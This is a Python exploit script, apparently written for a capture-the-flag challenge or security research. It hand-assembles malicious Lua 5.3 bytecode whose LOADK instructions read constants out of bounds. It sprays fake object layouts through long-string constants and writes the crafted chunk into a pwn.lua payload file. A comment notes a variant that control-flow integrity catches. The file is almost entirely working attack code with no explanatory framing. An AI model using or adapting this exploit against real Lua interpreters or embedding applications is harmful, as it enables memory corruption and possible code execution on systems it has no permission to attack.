#!/usr/bin/env python3

from struct import pack, Struct
from binascii import hexlify
import sys

LUA_TNIL           = 0
LUA_TBOOLEAN       = 1
LUA_TLIGHTUSERDATA = 2
LUA_TNUMBER        = 3
LUA_TSTRING        = 4
LUA_TTABLE         = 5
LUA_TFUNCTION      = 6
LUA_TUSERDATA      = 7
LUA_TTHREAD        = 8

LUA_TSHRSTR	= LUA_TSTRING | (0 << 4)
LUA_TLNGSTR	= LUA_TSTRING | (1 << 4)

LUA_TNUMFLT	= LUA_TNUMBER | (0 << 4)
LUA_TNUMINT	= LUA_TNUMBER | (1 << 4)


def assemble(asm):
    def Op(val):
        return val & 0x3f
    def A(val):
        assert(val < 0x100)
        return val << 6
    def B(val):
        assert(val < 0x200)
        return val << 14
    def C(val):
        assert(val < 0x200)
        return val << 23
    def Ax(val):
        assert(val < 0x4000000)
        return val << 6
    def Bx(val):
        assert(val < 0x40000)
        return val << 14
    def sBx(val):
        return Bx(val + 2**17)

    handlers = {
            'MOVE'    : (0, A, B),
            'LOADK'   : (1, A, Bx),
            'LOADKX'  : (2, A,),
            'LOADBOOL': (3, A, B, C),
            'LOADNIL' : (4, A, B),
            'GETUPVAL': (5, A, B),

            'GETTABUP': (6, A, B, C),
            'GETTABLE': (7, A, B, C),

            'SETTABUP': (8, A, B, C),
            'SETUPVAL': (9, A, B),
            'SETTABLE': (10, A, B, C),

            'NEWTABLE': (11, A, B, C),

            'SELF'    : (12, A, B, C),

            'ADD'     : (13, A, B, C),
            'SUB'     : (14, A, B, C),
            'MUL'     : (15, A, B, C),
            'MOD'     : (16, A, B, C),
            'POW'     : (17, A, B, C),
            'DIV'     : (18, A, B, C),
            'IDIV'    : (19, A, B, C),
            'BAND'    : (20, A, B, C),
            'BOR'     : (21, A, B, C),
            'BXOR'    : (22, A, B, C),
            'SHL'     : (23, A, B, C),
            'SHR'     : (24, A, B, C),
            'UNM'     : (25, A, B),
            'BNOT'    : (26, A, B),
            'NOT'     : (27, A, B),
            'LEN'     : (28, A, B),

            'CONCAT'  : (29, A, B, C),

            'JMP'     : (30, A, sBx),
            'EQ'      : (31, A, B, C),
            'LT'      : (32, A, B, C),
            'LE'      : (33, A, B, C),

            'TEST'    : (34, A, C),
            'TESTSET' : (35, A, B, C),

            'CALL'    : (36, A, B, C),
            'TAILCALL': (37, A, B, C),
            'RETURN'  : (38, A, B),

            'FORLOOP' : (39, A, sBx),
            'FORPREP' : (40, A, sBx),

            'TFORCALL': (41, A, C),
            'TFORLOOP': (42, A, sBx),

            'SETLIST' : (43, A, B, C),

            'CLOSURE' : (44, A, Bx),

            'VARARG'  : (45, A, B),

            'EXTRAARG': (46, Ax),
    }

    code = []

    for op, *args in asm:
        assert(op in handlers)
        opcode, *packers = handlers[op]

        assert(len(packers) == len(args))

        instr = Op(opcode)
        for i in range(len(packers)):
            instr |= packers[i](args[i])

        code.append(instr)

    return code

def dump_string(s):
    if len(s) == 0:
        return b'\x00'
    else:
        size = len(s) + 1
        if size < 0xff:
            return pack('=B', size) + s
        else:
            return pack('=BQ', 0xff, size) + s

def dump_code(asm):
    instrs = assemble(asm)
    codesize = pack('=I', len(instrs))
    code = b''.join(pack('=I', instr) for instr in instrs)

    return codesize + code

def dump_constants(constants):
    return pack('=I', len(constants)) + b''.join(constants)

def dump_upvalues():
    return pack('=I', 0)

def dump_protos():
    return pack('=I', 0)

def dump_debug():
    return pack('=III', 0, 0, 0)

def build_function(code, max_stacksize, constants):
    FunctionMetadata = Struct('=i i b b b')

    header = dump_string(b'@hax.lua') + FunctionMetadata.pack(0, 0, 0, 2, max_stacksize)

    code = dump_code(code)
    constants = dump_constants(constants)
    upvals = dump_upvalues()
    protos = dump_protos()
    debug = dump_debug()

    return header + code + constants + upvals + protos + debug

def build_chunk(asm, max_stacksize, constants):
    Header = Struct('=4s B B 6s B B B B B q d')

    header = Header.pack(b'\x1bLua', 83, 0, b'\x19\x93\r\n\x1a\n', 4, 8, 4, 8, 8, 0x5678, 370.5)
    upvals = pack('=B', 1)
    func = build_function(asm, max_stacksize, constants)

    return header + upvals + func


def pwn():
    MAX_STACKSIZE = 10
    ASM = [
        ('LOADK', 0, 104),
        ('LOADK', 1, 105),
        ('LOADK', 2, 106),
        ('RETURN', 0, 0)
    ]
    CONSTANTS = []

    content = pack('=B', LUA_TLNGSTR) + dump_string(pack('=QQQQQQQ', 0x4141414141414141, 0x31337, 0x13, 0x4141414141414141, 0x14, 0x4242424242424242, 0x45) * 5)

    for i in range(100):
        CONSTANTS.append(content)
        #CONSTANTS.append(pack('=B', LUA_TLNGSTR) + dump_string(pack('=QQ', 0x16, 0x42ceb1) * 25))          # CFI catches this

    chunk = build_chunk(ASM, MAX_STACKSIZE, CONSTANTS)

    code = open('pwn.tpl.lua', 'r').read()
    code = code.replace('CHUNK', hexlify(chunk).decode('ASCII'))

    with open('pwn.lua', 'w') as f:
        f.write(code)

if __name__ == '__main__':
    pwn()
